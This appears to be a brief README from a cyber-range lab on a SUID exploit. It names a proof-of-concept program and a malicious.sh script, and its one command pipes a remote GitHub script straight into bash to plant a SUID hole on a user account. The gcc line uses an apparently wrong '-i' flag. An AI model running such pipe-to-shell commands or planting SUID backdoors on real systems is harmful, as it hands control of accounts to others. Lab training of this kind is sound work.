# SUID Exploit Cliff-Notes

The malicious.sh is a shell script called by the poc.
The poc.c is compiled into poc.
	`gcc -i poc poc.c`

The user is compromised by performing: 
wget -O - https://raw.githubusercontent.com/cappetta/CyberRange/master/tutorials/seed/suid/getme.sh | bash

This creates a suid exposed vulnerability on the user, allows anyone to execute a shell script as the user.

